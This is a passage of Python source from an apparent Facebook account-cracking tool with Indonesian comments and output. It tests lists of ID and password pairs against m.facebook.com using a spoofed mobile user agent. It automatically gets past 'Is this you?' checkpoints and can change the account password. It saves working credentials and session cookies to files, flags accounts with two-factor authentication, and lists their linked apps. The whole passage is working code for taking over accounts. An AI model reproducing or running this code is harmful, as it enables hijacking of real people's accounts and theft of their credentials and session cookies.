		akun = fb.replace("\n","")
		ngecek  = akun.split("|")
		nomor+=1
		print("\n%s%s.%s \033[0mlogin akun %s> %s%s"%(H,str(nomor),O,M,K,akun.replace(" *--> ","")));jeda(0.07)
		try:
			mengecek(ngecek[0].replace("",""), ngecek[1])
		except requests.exceptions.ConnectionError:
			continue
	print("\n%s%s%s \033[0mSelesai mengecek akun"%(U,til,O));jeda(0.07)
	input('%s%s%s [%s Enter%s ] '%(U,til,O,U,O))
	back()
	
data = {}
data2 = {}

#--------------------------[ CHECK-OPSI-CHEKPOINT-2 ]----------------#
def mengecek(idf,pw):
	global loop,ubah_pass,pwbaru
	session=requests.Session()
	url = "https://m.facebook.com"
	session.headers.update({"Host":"m.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9","referer":"https://mbasic.facebook.com/","user-agent":"Mozilla/5.0 (Linux; Android 11; SM-A107F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/338.0.0.10.102;]','Mozilla/5.0 (Linux; Android 11; SM-A107F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_PT;FBAV/322.0.0.6.110;]','Mozilla/5.0 (Linux; U; Android 11; SM-A107F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36 OPR/7.1.2254.145530"})
	soup=bs4.BeautifulSoup(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	for x in soup("input"):
		data.update({x.get("name"):x.get("value")})
	data.update({"email":idf,"pass":pw})
	urlPost=session.post(url+link.get("action"),data=data)
	response=bs4.BeautifulSoup(urlPost.text, "html.parser")
	if "c_user" in session.cookies.get_dict():
		if "Akun Anda Dikunci" in urlPost.text:
			print("\r%s%s\033[0m akun terkunci sesi new"%(M,til))
		else:
			print("\r%s%s\033[0m akun tidak checkpoint, silahkan anda login "%(til,H))
			open('OK/OK-%s.txt'%(waktu), 'a').write(" %s|%s\n" % (idf,pw))
	elif "checkpoint" in session.cookies.get_dict():
		coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
		title=re.findall("\<title>(.*?)<\/title>",str(response))
		link2=response.find("form",{"method":"post"})
		listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
		for x in response("input"):
			if x.get("name") in listInput:
				data2.update({x.get("name"):x.get("value")})
		an=session.post(url+link2.get("action"),data=data2)
		response2=bs4.BeautifulSoup(an.text,"html.parser")
		cek=[cek.text for cek in response2.find_all("option")]
		number=0
		print("\r%s╰─%s \033[0mterdapat %s%s%s \033[0mopsi %s:"%(U,O,P,str(len(cek)),O,M));jeda(0.07)
		if(len(cek)==0):
			if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
				if "ubah_sandi" in ubah_pass:
					dat,dat2={},{}
					but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
					for x in response("input"):
						if x.get("name") in but:
							dat.update({x.get("name"):x.get("value")})
					ubahPw=session.post(url+link2.get("action"),data=dat).text
					resUbah=bs4.BeautifulSoup(ubahPw,"html.parser")
					link3=resUbah.find("form",{"method":"post"})
					but2=["submit[Next]","nh","fb_dtsg","jazoest"]
					if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
						for b in resUbah("input"):
							dat2.update({b.get("name"):b.get("value")})
						dat2.update({"password_new":"".join(pwbaru)})
						an=session.post(url+link3.get("action"),data=dat2)
						coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
						print("\r%s%s\033[0makun one tab, sandi berhasil di ubah \n╰─ OK %s%s%s|%s|%s			"%(H,til,N,H,idf,pwbaru[0],coki))
						open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s|%s\n" % (H,idf,pwbaru[0],coki))
						#cek_apk(coki)
				else:
					print("\r%s%s \033[0makun one tab, silahkan anda login		"%(H,til))
					open('OK/OK-%s.txt' %(waktu), 'a').write("%s %s|%s|%s\n" % (H,idf,pw,coki))
					#cek_apk(coki)
			elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
				print("\r%s╰─\033[0m akun terpasang autentikasi dua faktor			"%(M))
			else:
				print("%s%s\033[0mterjadi kesalahan"%(M,til))
		else:
			if "c_user" in session.cookies.get_dict():
				print("\r%s%s akun tidak checkpoint, silahkan anda login "%(H))
				open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s\n" % (H,idf,pw))
		for opsi in range(len(cek)):
			number +=1
			jalan ("  %s%s. %s%s"%(P,str(number),K,cek[opsi]))
	elif "login_error" in str(response):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print("%s╰─ %s"%(M,oh))
	else:
		print("%s╰─ \033[0mlogin gagal, silahkan cek kembali id dan kata sandi"%(M))
		
########ApK##############
def cek_apk(kuki):
	active = Tree("[b red]Aplikasi Terkait[b white]")
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			
			active.add("\%s \33[0m %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\    %s\33[0m cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			nonactive = Tree(f"[b red]Aplikasi Tak Terkait[b white]")
			nonactive.add("\%s \33[0m  %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\    %s \33[0mcookie invalid"%(M))
		cetak(active,nonactive)
#----------------------[ CEK-APLIKASI ]---------------------#
def get_active(actie,cookie):
	ses = requests.Session()
	try:
		data = parser(ses.get(url,cookies={"cookie": cookie}).text,"html.parser")
		game = [i.text for i in data.find_all("h3")]
		if len(game)==0:
			active.add(f"{P}tidak ada aplikasi yang terkait")
		else:
			for i in range(len(game)):
				active.add(f"{H}{str(game[i]).replace('Ditambahkan',' Ditambahkan')}")
			else:pass
		next = "https://mbasic.facebook.com"+data.find("a",string="Lihat Lainnya")["href"]
		get_active(next,active,cookie)
	except:pass


#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('DUMP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	login()

#>>>>> THANKS TO THIS HERE <<<<<<<#
#>>>>> Alvino_Adijaya_Xy <<<<<#
